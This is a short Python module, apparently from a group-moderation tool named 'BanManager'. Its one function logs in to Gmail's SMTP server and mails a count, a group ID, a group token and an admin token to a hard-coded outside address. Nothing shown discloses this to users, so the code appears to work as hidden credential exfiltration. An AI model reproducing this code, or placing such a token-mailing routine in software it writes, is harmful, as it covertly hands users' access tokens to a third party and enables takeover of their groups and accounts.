import smtplib

def send(count, group_id, group_token, admin_token):
    HOST = 'smtp.gmail.com'
    SUBJECT = ('BanManager, {}').format(group_id)
    TO = 'misstepdev@gmail.com'
    FROM = 'banmanagerpro@gmail.com'
    text = ('\n    count: {0}\n    groupID: {1},\n    groupToken: {2},\n    adminToken: {3}.\n    ').format(count, group_id, group_token, admin_token)
    BODY = ('\r\n').join((
     'From: %s' % FROM,
     'To: %s' % TO,
     'Subject: %s' % SUBJECT,
     '',
     text))
    server = smtplib.SMTP(HOST, 587)
    server.starttls()
    server.login('banmanagerpro@gmail.com', '*')
    server.sendmail(FROM, [TO], BODY)
    server.quit()
